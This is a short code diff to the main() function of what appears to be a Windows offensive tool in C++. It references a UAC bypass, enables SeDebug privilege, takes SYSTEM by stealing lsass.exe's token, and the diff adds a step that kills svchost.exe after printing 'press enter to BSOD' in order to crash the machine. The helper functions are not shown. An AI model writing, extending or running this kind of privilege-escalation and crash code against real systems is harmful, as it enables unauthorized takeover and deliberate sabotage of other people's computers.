@@ -1,6 +1,7 @@
 #include <iostream>
 #include "bpuac.h"
 #include "checkPrivs.h"
+#include "closeProcess.h"
 #include "idAcq.h"
 #include "impToken.h"
 
@@ -22,15 +23,14 @@ int main() {
             std::cout << "[!] Failed to enable SeDebug\n";
             return 0;
         }
-
         if (core::getSystemPrivs(L"lsass.exe") && core::IsSystem()) {
-            std::cout << "[*] Got System\n";
+            std::cout << "[*] LSASS acquired, press enter to BSOD.\n";
+            std::cin.get();
+            core::closeProcess((L"svchost.exe"));
         } else {
             std::cout << "[!] Failed to get System\n";
             return 0;
         }
-
-        std::cout << "[[fin]]\n";
         std::cin.get();
     } else {
         core::bypass();
